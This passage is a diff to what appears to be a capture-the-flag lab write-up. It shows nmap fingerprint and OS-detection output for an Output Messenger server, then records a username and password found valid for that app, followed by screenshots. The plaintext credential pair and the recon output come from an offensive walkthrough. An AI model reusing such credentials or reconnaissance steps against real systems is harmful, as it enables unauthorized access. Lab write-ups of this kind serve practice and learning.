+SF:rver\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(HTTPOptions,33,"Ou
+SF:put\x20Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0"
+SF:)%r(RTSPRequest,33,"Ouput\x20Messenger\x20Server\x20-\x20Switching\x20S
+SF:erver\x20V2\.0\.42\.0")%r(RPCCheck,33,"Ouput\x20Messenger\x20Server\x20
+SF:-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(DNSVersionBindReqTCP,33,"O
+SF:uput\x20Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0
+SF:")%r(DNSStatusRequestTCP,33,"Ouput\x20Messenger\x20Server\x20-\x20Switc
+SF:hing\x20Server\x20V2\.0\.42\.0")%r(Help,33,"Ouput\x20Messenger\x20Serve
+SF:r\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(SSLSessionReq,33,"Oup
+SF:ut\x20Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")
+SF:%r(TerminalServerCookie,33,"Ouput\x20Messenger\x20Server\x20-\x20Switch
+SF:ing\x20Server\x20V2\.0\.42\.0")%r(TLSSessionReq,33,"Ouput\x20Messenger\
+SF:x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(Kerberos,33,"
+SF:Ouput\x20Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.
+SF:0")%r(SMBProgNeg,33,"Ouput\x20Messenger\x20Server\x20-\x20Switching\x20
+SF:Server\x20V2\.0\.42\.0")%r(X11Probe,33,"Ouput\x20Messenger\x20Server\x2
+SF:0-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(FourOhFourRequest,33,"Oup
+SF:ut\x20Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")
+SF:%r(LPDString,33,"Ouput\x20Messenger\x20Server\x20-\x20Switching\x20Serv
+SF:er\x20V2\.0\.42\.0")%r(LDAPSearchReq,33,"Ouput\x20Messenger\x20Server\x
+SF:20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(LDAPBindReq,33,"Ouput\x2
+SF:0Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(SI
+SF:POptions,33,"Ouput\x20Messenger\x20Server\x20-\x20Switching\x20Server\x
+SF:20V2\.0\.42\.0")%r(LANDesk-RC,33,"Ouput\x20Messenger\x20Server\x20-\x20
+SF:Switching\x20Server\x20V2\.0\.42\.0")%r(TerminalServer,33,"Ouput\x20Mes
+SF:senger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(NCP,33
+SF:,"Ouput\x20Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42
+SF:\.0");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port14122-TCP:V=7.94SVN%I=7%D=12/26%Time=676D6340%P=x86_64-pc-linux-gnu
+SF:%r(GenericLines,33,"Ouput\x20Messenger\x20Server\x20-\x20Switching\x20S
+SF:erver\x20V2\.0\.42\.0")%r(GetRequest,33,"Ouput\x20Messenger\x20Server\x
+SF:20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(HTTPOptions,33,"Ouput\x2
+SF:0Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(RT
+SF:SPRequest,33,"Ouput\x20Messenger\x20Server\x20-\x20Switching\x20Server\
+SF:x20V2\.0\.42\.0")%r(RPCCheck,33,"Ouput\x20Messenger\x20Server\x20-\x20S
+SF:witching\x20Server\x20V2\.0\.42\.0")%r(DNSVersionBindReqTCP,33,"Ouput\x
+SF:20Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(D
+SF:NSStatusRequestTCP,33,"Ouput\x20Messenger\x20Server\x20-\x20Switching\x
+SF:20Server\x20V2\.0\.42\.0")%r(Help,33,"Ouput\x20Messenger\x20Server\x20-
+SF:\x20Switching\x20Server\x20V2\.0\.42\.0")%r(SSLSessionReq,33,"Ouput\x20
+SF:Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(Ter
+SF:minalServerCookie,33,"Ouput\x20Messenger\x20Server\x20-\x20Switching\x2
+SF:0Server\x20V2\.0\.42\.0")%r(TLSSessionReq,33,"Ouput\x20Messenger\x20Ser
+SF:ver\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(Kerberos,33,"Ouput\
+SF:x20Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(
+SF:SMBProgNeg,33,"Ouput\x20Messenger\x20Server\x20-\x20Switching\x20Server
+SF:\x20V2\.0\.42\.0")%r(X11Probe,33,"Ouput\x20Messenger\x20Server\x20-\x20
+SF:Switching\x20Server\x20V2\.0\.42\.0")%r(FourOhFourRequest,33,"Ouput\x20
+SF:Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(LPD
+SF:String,33,"Ouput\x20Messenger\x20Server\x20-\x20Switching\x20Server\x20
+SF:V2\.0\.42\.0")%r(LDAPSearchReq,33,"Ouput\x20Messenger\x20Server\x20-\x2
+SF:0Switching\x20Server\x20V2\.0\.42\.0")%r(LDAPBindReq,33,"Ouput\x20Messe
+SF:nger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(SIPOptio
+SF:ns,33,"Ouput\x20Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.
+SF:0\.42\.0")%r(LANDesk-RC,33,"Ouput\x20Messenger\x20Server\x20-\x20Switch
+SF:ing\x20Server\x20V2\.0\.42\.0")%r(TerminalServer,33,"Ouput\x20Messenger
+SF:\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0")%r(NCP,33,"Oupu
+SF:t\x20Messenger\x20Server\x20-\x20Switching\x20Server\x20V2\.0\.42\.0");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6.32
+OS details: Linux 2.6.32
+Network Distance: 0 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 245.83 seconds
 ```
 
-Seems the box has changed. Giving up...
+`k.turner`/`MessengerApp@Pass!` is found to be valid credentials for the Output Messenger app
+
+![image](https://github.com/user-attachments/assets/b04ba2a2-dd1e-4b86-99ba-7babedcbd189)
+
+![image](https://github.com/user-attachments/assets/fcb9d021-2814-49a2-8656-9b2dcff2225f)
+
+![image](https://github.com/user-attachments/assets/df497c92-71ab-4dfa-90fa-65ebf52e3a87)
+
+Nothing much found other than some idle banter among the devs
